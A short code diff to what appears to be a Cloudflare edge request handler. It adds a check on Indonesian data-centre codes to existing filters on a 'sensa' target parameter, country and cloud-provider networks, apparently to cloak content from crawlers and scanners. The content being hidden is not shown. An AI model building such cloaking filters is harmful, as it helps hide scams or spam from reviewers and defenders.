@@ -7,11 +7,16 @@ export async function onRequest(context) {
   const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
   const targetKey = url.searchParams.get('target');
   const country = request.cf ? request.cf.country : 'Unknown';
+  const colo = request.cf ? request.cf.colo : '';
   const asOrganization = request.cf ? (request.cf.asOrganization || '').toLowerCase() : '';
   if (targetKey !== 'sensa') {
     return next();
   }
   if (country !== 'ID') {
+    return next();
+  }
+  const allowedColo = ['CGK', 'SUB', 'BTH', 'DPS', 'UPG', 'KNO'];
+  if (!allowedColo.includes(colo)) {
     return next();
   }
   const cloudProviders = ['amazon', 'google', 'digitalocean', 'microsoft', 'cloudflare', 'akamai', 'linode', 'ovh', 'datacentre'];
